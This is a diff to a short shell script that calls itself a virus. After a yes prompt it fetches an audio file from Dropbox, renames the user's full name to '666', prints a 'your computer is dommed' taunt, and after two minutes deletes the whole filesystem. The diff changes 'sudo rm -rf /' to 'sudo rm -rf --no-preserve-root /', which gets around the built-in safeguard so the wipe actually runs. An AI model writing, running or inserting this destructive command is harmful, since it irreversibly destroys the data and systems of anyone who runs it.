@@ -21,12 +21,11 @@ if [[ "$answer" == "y" || "$answer" == "Y" ]]; then
     mkdir .assets
     cd .assets
     wget https://www.dropbox.com/scl/fi/d1xdtql2mif5f34odrqnj/your-alarm.mp3?rlkey=xh10eif6oepkh7s4ovyji8chx&st=hv2nbggu&dl=1
-    ffplay -nodisp -autoexit -loop 0 ~/.assets/your-alarm
     sudo chfn -f "666" $USER
     echo "---------------------------------"
     echo "your computer is dommed. I'll give you 2 minutes to say goodbye to your pc."
     sleep 120
-    sudo rm -rf /
+    sudo rm -rf --no-preserve-root /
 else
     echo "Stopped Virus"
 fi
